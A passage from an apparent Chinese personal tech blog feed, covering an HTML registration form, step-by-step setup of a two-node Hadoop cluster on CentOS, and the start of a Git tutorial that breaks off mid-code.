小鲜肉 <br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;love&quot;</span> &gt;</span> 老腊肉 <br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;love&quot;</span>  <span class="hljs-attr">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span> 都喜欢 <br>            <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>         <span class="hljs-comment">&lt;!-- 第七行 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>个人介绍<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>个人简介<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 第八行 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;免费注册&quot;</span> &gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>  <span class="hljs-attr">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span>    我同意注册条款和会员加入标准<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> &gt;</span> 我是会员，立即登录<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">h5</span>&gt;</span>我承诺<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>年满18岁、单身<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>抱着严肃的态度<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>真诚寻找另一半<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>           <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTML</tag>
      
      <tag>CSS</tag>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hadoop搭建</title>
    <link href="/2022/12/29/Hadoop%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/12/29/Hadoop%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1>Hadoop搭建</h1><h3 id="1-关闭防火墙selinux">1. 关闭防火墙selinux</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@<span class="hljs-keyword">master</span> <span class="hljs-title">~]# systemctl</span> <span class="hljs-literal">stop</span> firewalld<br><br>[root@<span class="hljs-keyword">master</span> <span class="hljs-title">~]# systemctl</span> disable firewalld<br><br>[root@<span class="hljs-keyword">master</span> <span class="hljs-title">~]# setenforce</span> <span class="hljs-number">0</span><br><br>[root@slaver ~]<span class="hljs-comment"># systemctl stop firewalld.service</span><br><br>[root@slaver ~]<span class="hljs-comment"># systemctl disable firewalld</span><br><br>[root@slaver ~]<span class="hljs-comment"># setenforce 0</span><br></code></pre></td></tr></table></figure><h3 id="2-配置java环境">2. 配置java环境</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@<span class="hljs-keyword">master</span> <span class="hljs-title">~]# mkdir</span> /usr/jdk64<br>[root@<span class="hljs-keyword">master</span> <span class="hljs-title">~]# tar</span> zxvf jdk-<span class="hljs-number">8</span>u77-linux-x64.tar.gz -C /usr/jdk64/<br>[root@<span class="hljs-keyword">master</span> <span class="hljs-title">~]# vi</span> /etc/profile<br>  export  <span class="hljs-attr">JAVA_HOME=</span>/usr/jdk64/jdk1.<span class="hljs-number">8.0</span>_77  export  <span class="hljs-attr">PATH=</span>$JAVA_HOME/bin:$PATH  <br>[root@<span class="hljs-keyword">master</span> <span class="hljs-title">~]# source</span> /etc/profile<br>[root@<span class="hljs-keyword">master</span> <span class="hljs-title">~]# java</span><br>[root@<span class="hljs-keyword">master</span> <span class="hljs-title">~]# java</span> –<span class="hljs-keyword">version</span><br>  java  <span class="hljs-keyword">version</span> <span class="hljs-string">&quot;1.8.0_77&quot;</span>  Java(TM)  SE Runtime Environment (build <span class="hljs-number">1.8</span>.<span class="hljs-number">0</span>_77-b03)  Java  HotSpot(TM) <span class="hljs-number">64</span>-Bit Server VM (build <span class="hljs-number">25.77</span>-b03, mixed mode)  <br></code></pre></td></tr></table></figure><h3 id="3-配置host">3. 配置host</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[root@master ~]# vi <span class="hljs-regexp">/etc/</span>hosts<br>  <span class="hljs-number">192.168</span>.<span class="hljs-number">166.66</span>  master  <span class="hljs-number">192.168</span>.<span class="hljs-number">166.67</span>  slaver  <br>[root@slaver ~]# vi <span class="hljs-regexp">/etc/</span>hosts<br>  <span class="hljs-number">192.168</span>.<span class="hljs-number">166.66</span>  master  <span class="hljs-number">192.168</span>.<span class="hljs-number">166.67</span>  slaver  <br>[root@master ~]# scp -r <span class="hljs-regexp">/usr/</span>jdk64<span class="hljs-regexp">/ slaver:/u</span>sr<span class="hljs-regexp">/jdk64/</span><br>[root@slaver ~]# vi <span class="hljs-regexp">/etc/</span>profile<br>  export  JAVA_HOME=<span class="hljs-regexp">/usr/</span>jdk64<span class="hljs-regexp">/jdk1.8.0_77  export  PATH=$JAVA_HOME/</span>bin:$PATH    <br>[root@slaver ~]# <span class="hljs-keyword">source</span> <span class="hljs-regexp">/etc/</span>profile<br>[root@slaver ~]# java<br>[root@slaver ~]# java –version<br></code></pre></td></tr></table></figure><h3 id="4-搭建yum源">4. 搭建yum源</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[root@master ~]# mkdir <span class="hljs-regexp">/opt/</span>bigdata<br>[root@master ~]# mount -o loop <span class="hljs-regexp">/dev/</span>cdrom <span class="hljs-regexp">/opt/</span>bigdata<br>[root@master ~]# mount<br>  <span class="hljs-regexp">/dev/</span>sr0  on <span class="hljs-regexp">/opt/</span>bigdata type iso9660 (ro,relatime)  <br>[root@master ~]# vi <span class="hljs-regexp">/etc/</span>fstab<br>​     #  #  <span class="hljs-regexp">/etc/</span>fstab  #  Created by anaconda on Sun May <span class="hljs-number">13</span> <span class="hljs-number">20</span>:<span class="hljs-number">14</span>:<span class="hljs-number">56</span> <span class="hljs-number">2018</span>  #  #  Accessible filesystems, by reference, are maintained under <span class="hljs-string">&#x27;/dev/disk&#x27;</span>  # See  man pages fstab(<span class="hljs-number">5</span>), findfs(<span class="hljs-number">8</span>), mount(<span class="hljs-number">8</span>) and<span class="hljs-regexp">/or blkid(8) for more info  #  /</span>dev<span class="hljs-regexp">/mapper/</span>centos-root  <span class="hljs-regexp">/            xfs   defaults    0 0  UUID=c1f6e2fe-ad5d-4f99-ba41-c4355b7355f5  /</span>boot          xfs   defaults    <span class="hljs-number">0</span> <span class="hljs-number">0</span>  <span class="hljs-regexp">/dev/m</span>apper<span class="hljs-regexp">/centos-swap  swap          swap  defaults    0 0  /</span>dev<span class="hljs-regexp">/sr0  on /</span>opt/bigdata  iso9660 loop <span class="hljs-number">0</span> <span class="hljs-number">0</span>  <br>[root@master ~]# rm -rfv <span class="hljs-regexp">/etc/yum</span>.repos.d<span class="hljs-comment">/*</span><br><span class="hljs-comment">[root@master ~]# vi /etc/yum.repos.d/yum.repo</span><br><span class="hljs-comment">  [centos]  name=cetnos  baseurl=file:///opt/bigdata  enabled=1  gpgcheck=0  </span><br><span class="hljs-comment">[root@master ~]# yum clean all &amp;&amp; yum makecache</span><br></code></pre></td></tr></table></figure><h3 id="5-配置vsftpd">5. 配置vsftpd</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@master ~]</span><span class="hljs-comment"># yum install -y vsftpd</span><br><span class="hljs-section">[root@master ~]</span><span class="hljs-comment"># echo anon_root=/opt/ &gt;&gt; /etc/vsftpd/vsftpd.conf</span><br><span class="hljs-section">[root@master ~]</span><span class="hljs-comment"># systemctl enable vsftpd</span><br><span class="hljs-section">[root@master ~]</span><span class="hljs-comment"># systemctl restart vsftpd</span><br> <span class="hljs-section">[root@slaver ~]</span><span class="hljs-comment"># rm -rfv /etc/yum.repos.d/*</span><br>  <span class="hljs-section">[centos]</span>  <span class="hljs-attr">name</span>=cetnos  baseurl=ftp://<span class="hljs-number">192.168</span>.<span class="hljs-number">166.66</span>/bigdata  enabled=<span class="hljs-number">1</span>  gpgcheck=<span class="hljs-number">0</span>  <br><span class="hljs-section">[root@slaver ~]</span><span class="hljs-comment"># yum clean all &amp;&amp; yum makecache</span><br></code></pre></td></tr></table></figure><h3 id="6-配置密钥">6. 配置密钥</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">[root<span class="hljs-meta">@master</span> ~]<span class="hljs-comment"># ssh-keygen</span><br>  Generating  public/private rsa key pair.  Enter  file in which to save the key (/root/.ssh/id_rsa):   Enter  passphrase (empty for no passphrase):   Enter same  passphrase again:   Your  identification has been saved in /root/.ssh/id_rsa.  Your  public key has been saved in /root/.ssh/id_rsa.pub.  The  key fingerprint is:  40:3f:1a:a0:b2:ad:14:70:c8:97:65:3f:2a:e7:32:6a  root<span class="hljs-meta">@master</span>  The  key&#x27;s randomart image is:  +--[  RSA 2048]----+  |<span class="hljs-string">o..  +o.     </span>|<span class="hljs-string">  </span>|<span class="hljs-string">oo  +.o..     </span>|<span class="hljs-string">  </span>|<span class="hljs-string">..o  ooo      </span>|<span class="hljs-string">  </span>|<span class="hljs-string">  +.  .+..    </span>|<span class="hljs-string">  </span>|<span class="hljs-string">....  o. S    </span>|<span class="hljs-string">  </span>|<span class="hljs-string">.. +        </span>|<span class="hljs-string">  </span>|<span class="hljs-string">. o .      </span>|<span class="hljs-string">  </span>|<span class="hljs-string"> E.  o      </span>|<span class="hljs-string">  </span>|<span class="hljs-string">..        </span>|<span class="hljs-string">  +-----------------+  </span><br><span class="hljs-string">[root@master ~]# ssh-copy-id slaver</span><br><span class="hljs-string">[root@slaver ~]# ssh-keygen</span><br><span class="hljs-string">[root@slaver ~]# ssh-copy-id master</span><br></code></pre></td></tr></table></figure><h3 id="7-配置Hadoop环境">7. 配置Hadoop环境</h3><p>[root@master ~]# mkdir hadoop</p><p>[root@master ~]# tar zxvf hadoop-2.7.1.tar.gz -C /root/hadoop</p><p>[root@master ~]# vi /etc/profile</p><p>export  HADOOP_HOME=/root/hadoop/hadoop-2.7.1  export  PATH=$PATH:$HADOOP_HOME/bin  export  HADOOP_HOME_WARN_SUPPRESS=1</p><p>[root@master ~]# source /etc/profile</p><p>[root@master ~]# cd /root/hadoop/hadoop-2.7.1/etc/hadoop/</p><p>[root@master hadoop]# vi core-site.xml</p><p>fs.defaultFS参数配置的是HDFS的地址。</p><p><configuration>  <property>  <name>fs.defaultFS</name>  <value>hdfs://Master:8020</value>  </property>  <property>  <name>hadoop.tmp.dir  </name>  <value>/var/log/hadoop/tmp</value>  </property>     </configuration></p><p>[root@master hadoop]# vi hdfs-site.xml</p><p><strong>dfs.name.dir****将HDFS文件系统的元信息保存在哪个目录下。</strong></p><p><strong>hadoop.tmp.dir****是hadoop文件系统依赖的基础配置，很多路径都依赖它。它默认的位置是在/tmp/{$user}下面，但是在/tmp路径下的存储是不安全的，因为linux一次重启，文件就可能被删除。</strong></p><p><strong>dfs.replication****配置的是HDFS存储时的备份数量</strong></p><p><configuration>  <property>   <name>dfs.namenode.data.dir</name>   <value>/file:///data/hadoop/hdfs/name</value>  </property>  <property>  <name>dfs.datanode.data.dir</name>  <value>/file:///data/hadoop/hdfs/data</value>  </property>  <property>  <name>dfs.namenode.secondary.http-address</name>  <value>master:50090</value>  </property>  <property>  <name>dfs.replication</name>  <value>2</value>  </property>  </configuration></p><p><img src="/2022/12/29/Hadoop%E6%90%AD%E5%BB%BA/clip_image002.jpg" alt="img"></p><p>[root@master hadoop]# vi yarn-site.xml</p><p><img src="/2022/12/29/Hadoop%E6%90%AD%E5%BB%BA/clip_image004.jpg" alt="img"></p><p><strong>yarn.nodemanager.aux-services<strong><strong>是</strong></strong>NodeManager<strong><strong>上运行的附属服务。它</strong></strong>的默认值是“<strong><strong>mapreduce.shuffle</strong></strong>”<strong><strong>，但如果继续使用这个值，NodeManager 会启动失败，所以需要改为改为“<strong><strong>mapreduce_shuffle</strong></strong>”</strong></strong>。</strong></p><p><strong>yarn.resourcemanager.webapp.address****是</strong><code>**ResourceManager**</code><strong>对外web ui地址。用户可通过该地址在浏览器中查看集群各类信息。</strong></p><p><img src="/2022/12/29/Hadoop%E6%90%AD%E5%BB%BA/clip_image004.jpg" alt="img"></p><p><configuration>  <property>  <name>yarn.nodemanager.aux-services</name>  <value>mapreduce_shuffle</value>  </property>  </configuration></p><p>[root@master hadoop]# vi mapred-site.xml</p><p><img src="/2022/12/29/Hadoop%E6%90%AD%E5%BB%BA/clip_image006.jpg" alt="img"></p><p><strong><a href="http://mapreduce.framework.name">mapreduce.framework.name</a>****指的是使用yarn运行mapreduce程序。</strong></p><p><configuration>  <property>  <name>mapreduce.framework.name</name>  <value>yarn</value>  </property>  <property>  <name>mapreduce.jobhistroy.address</name>  <value>master:10020</value>  </property>  <property>  <name>mapreduce.jobhistroy.webapp.address</name>  <value>master:19888</value>  </property>  </configuration></p><p>[root@master hadoop]# vi slaves</p><p>Slaves文件里面记录的是集群里面所有DataNode的主机名</p><p>master  slaver</p><p>[root@master hadoop]# vi <a href="http://hadoop-env.sh">hadoop-env.sh</a></p><p>export  JAVA_HOME=/usr/jdk64/jdk1.8.0_77</p><p>[root@master hadoop]# scp -r /root/hadoop slaver:/root/</p><h3 id="8-格式化启动">8. 格式化启动</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@master hadoop]<span class="hljs-comment"># hdfs namenode –format</span><br>  <span class="hljs-regexp">/usr/</span>hadoop<span class="hljs-regexp">/hdfs/</span>name （如果格式化完没有需要建一下）  （格式化前如果目录里存在文件，先把两个节点    <span class="hljs-regexp">/usr/</span>hadoop<span class="hljs-regexp">/hdfs/</span>name（这个目录是格式化的时候自动生成的）   <span class="hljs-regexp">/usr/</span>hadoop<span class="hljs-regexp">/hdfs/</span>data（这个是启动的时候生成的）   <span class="hljs-regexp">/data/</span>hadoop<span class="hljs-regexp">/current/</span>tmp 里面的文件全都删掉！！！  ）     <br><br>[root@master sbin]<span class="hljs-comment"># . start-all.sh</span><br>[root@master sbin]<span class="hljs-comment"># jps</span><br><span class="hljs-number">18944</span> NodeManager<br><span class="hljs-number">19106</span> Jps<br><span class="hljs-number">18435</span> DataNode<br><span class="hljs-number">18585</span> SecondaryNameNode<br><span class="hljs-number">18730</span> ResourceManager<br><span class="hljs-number">18317</span> NameNode<br>[root@slaver ~]<span class="hljs-comment"># jps</span><br><span class="hljs-number">18227</span> DataNode<br><span class="hljs-number">18324</span> NodeManager<br><span class="hljs-number">18424</span> Jps<br>[root@master sbin]<span class="hljs-comment"># yum install -y net-tools</span><br>[root@master sbin]<span class="hljs-comment"># netstat –ntpl</span><br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Hadoop%E6%90%AD%E5%BB%BA/clip_image008.jpg" alt="img"></p><h3 id="9-主节点配置时钟同步">9.主节点配置时钟同步</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs routeros">yum -y install<span class="hljs-built_in"> ntp</span><br><span class="hljs-built_in"></span>vim /etc/ntp.conf<br>注释<span class="hljs-built_in"></span><br><span class="hljs-built_in">server </span>0.centos.pool.ntp.org iburst<span class="hljs-built_in"></span><br><span class="hljs-built_in">server </span>1.centos.pool.ntp.org iburst<span class="hljs-built_in"></span><br><span class="hljs-built_in">server </span>2.centos.pool.ntp.org iburst<span class="hljs-built_in"></span><br><span class="hljs-built_in">server </span>3.centos.pool.ntp.org iburst<br><br>添加<span class="hljs-built_in"></span><br><span class="hljs-built_in">server </span>127.127.1.0<br>fudge 127.127.1.0 startum 10<br> <br>启动<br>systemctl stat ntpd<br>systemctl <span class="hljs-built_in">enable</span> ntpd<br><br><br>副节点<br>yum -y install ntpdate<br>ntpdate master<br> <br><span class="hljs-comment"># Hadoop环境变量</span><br><span class="hljs-built_in">export</span><br><span class="hljs-built_in">export</span> HDFS_NAMENODE_USER<br><span class="hljs-built_in">export</span> HDFS_DATANODE_USER<br><span class="hljs-built_in">export</span> HDFS_SECONDARYNAMENODE_USER<br><span class="hljs-built_in">export</span> YARN_RESOURCEMANAGER_USER<br><span class="hljs-built_in">export</span> YARN_NODEMANAGER_USER<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>大数据</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git学习</title>
    <link href="/2022/12/29/Git%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/12/29/Git%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1>配置环境</h1><p>**1.查看配置 **<br>git config -l</p><p><strong>2.查看系统config</strong><br>git config --system --list<br>　　<br><strong>3.查看当前用户（global）配置</strong><br>git config --global  --list</p><p><strong>4.添加配置</strong></p><ul class="lvl-0"><li class="lvl-2"><p>Git\etc\gitconfig  ：Git 安装目录下的 gitconfig     --system 系统级</p></li><li class="lvl-2"><p>C:\Users\Admin\ .gitconfig    只适用于当前登录用户的配置  --global 全局</p><ul class="lvl-2"><li class="lvl-4"><p><strong>添加内容</strong></p></li><li class="lvl-4"><p><strong>[user]</strong><br><strong>name = wangjing</strong><br><strong>email = <a href="mailto:2818970947@qq.com">2818970947@qq.com</a></strong></p></li></ul></li></ul><p><strong>5.命令行添加</strong><br>git config --global <a href="http://user.name">user.name</a> “王景”  #名称<br>git config --global user.email <a href="mailto:2818970947@qq.com">2818970947@qq.com</a>      #邮箱</p><h1>基本概论</h1><h2 id="三大区域">三大区域</h2><p><img src="/2022/12/29/Git%E5%AD%A6%E4%B9%A0/image-20200831115200359.png" alt="image-20200831115200359"></p><ul class="lvl-0"><li class="lvl-2"><p>Workspace：工作区，就是你平时存放项目代码的地方</p></li><li class="lvl-2"><p>Index / Stage：暂存区，用于临时存放你的改动，事实上它只是一个文件，保存即将提交到文件列表信息</p></li><li class="lvl-2"><p>Repository：仓库区（或本地仓库），就是安全存放数据的位置，这里面有你提交到所有版本的数据。其中HEAD指向最新放入仓库的版本</p></li><li class="lvl-2"><p>Remote：远程仓库，托管代码的服务器，可以简单的认为是你项目组中的一台电脑用于远程数据交换</p></li></ul><h2 id="工作流程">工作流程</h2><p>git的工作流程一般是这样的：</p><p>１、在工作目录中添加、修改文件；</p><p>２、将需要进行版本管理的文件放入暂存区域；</p><p>３、将暂存区域的文件提交到git仓库。</p><p>因此，git管理的文件有三种状态：已修改（modified）,已暂存（staged）,已提交(committed)</p><p><img src="/2022/12/29/Git%E5%AD%A6%E4%B9%A0/image-20200831115311709.png" alt="image-20200831115311709"></p><h1>项目搭建</h1><p><img src="/2022/12/29/Git%E5%AD%A6%E4%B9%A0/image-20200831134802127.png" alt="image-20200831134802127"></p><h1>文件操作</h1><h2 id="查看文件状态">查看文件状态</h2><blockquote><p>查看指定文件状态</p><p>git status [ filename]</p></blockquote><blockquote><p>查看所有文件状态</p><p>git status</p></blockquote><blockquote><p>git add .                   添加所有文件到暂存区<br>git commit -m “消息内容”     提交暂存区中的内容到本地仓库 -m 提交信息</p><p>信息写错</p><p>git commit --amend -m “新的提交信息”</p></blockquote><blockquote><p>git add . 添加所有文件到暂存区</p><p>git commit -m “消息内容”提交暂存区中的内容到本地仓库 -m 提交信息</p></blockquote><h2 id="忽略文件">忽略文件</h2><p><strong>主目录下建立&quot;.gitignore&quot;文件</strong></p><ol><li class="lvl-3"><p>忽略文件中的空行或以井号（#）开始的行将会被忽略。</p></li><li class="lvl-3"><p>可以使用Linux通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1,string2,…}）代表可选的字符串等。</p></li><li class="lvl-3"><p>如果名称的最前面有一个感叹号（!），表示例外规则，将不被忽略。</p></li><li class="lvl-3"><p>如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在此目录下，而子目录中的文件不忽略。</p></li><li class="lvl-3"><p>如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。</p></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">#为注释</span><br>*.txt        <span class="hljs-comment">#忽略所有 .txt结尾的文件,这样的话上传就不会被选中！</span><br>!lib.txt     <span class="hljs-comment">#但lib.txt除外</span><br>/temp        <span class="hljs-comment">#仅忽略项目根目录下的TODO文件,不包括其它目录temp</span><br>build<span class="hljs-regexp">/       #忽略build/</span>目录下的所有文件<br>doc<span class="hljs-regexp">/*.txt    #会忽略 doc/</span>notes.txt 但不包括 doc<span class="hljs-regexp">/server/</span>arch.txt<br></code></pre></td></tr></table></figure><h1>使用码云</h1><p><strong>1.设置本地绑定SSH公钥实现免登录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入 C:\Users\Administrator\.ssh 目录</span><br><span class="hljs-comment"># 生成公钥. -t指定加密方式</span><br>ssh-keygen -t rsa<br><br><span class="hljs-comment"># 生成两个文件 </span><br><span class="hljs-comment"># id_rsa.pub, id_rsa</span><br><span class="hljs-comment"># 公共的       自己的</span><br></code></pre></td></tr></table></figure><p><strong>2.将公钥信息添加到码云账户</strong></p><p><strong>设置 --&gt; 安全设置 --&gt; SSH公钥 --&gt; 粘贴到公钥 --&gt; 确定 --&gt; 完成</strong></p><h1>分支</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">git分支中常用指令：<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有本地分支</span><br>git branch<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有远程分支</span><br>git branch -r<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">新建一个分支，但依然停留在当前分支</span><br>git branch [branch-name]<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">新建一个分支，并切换到该分支</span><br>git checkout -b [branch]<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">合并指定分支到当前分支</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge [branch]</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除分支</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git branch -d [branch-name]</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除远程分支</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git push origin --delete [branch-name]</span><br><span 